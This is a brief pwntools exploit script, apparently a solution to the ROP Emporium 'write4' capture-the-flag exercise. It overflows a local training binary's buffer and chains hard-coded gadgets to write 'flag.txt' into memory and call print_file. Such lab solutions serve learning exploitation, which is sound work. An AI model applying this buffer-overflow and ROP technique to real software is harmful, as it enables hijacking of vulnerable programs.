from pwn import *  
  
p = process('./write4')  
elf = ELF('./write4')  
printFile_addr = elf.plt['print_file']  
data_addr = 0x0000000000601028  
movData_addr = 0x0000000000400628 
popR14R15_addr = 0x0000000000400690 
popRdi_addr = 0x0000000000400693 
payload = 'A'*40 + p64(popR14R15_addr)+p64(data_addr)+'flag.txt'+p64(movData_addr)+p64(popRdi_addr)+p64(data_addr)+p64(printFile_addr)  
p.sendlineafter('> ',payload)  
p.interactive()
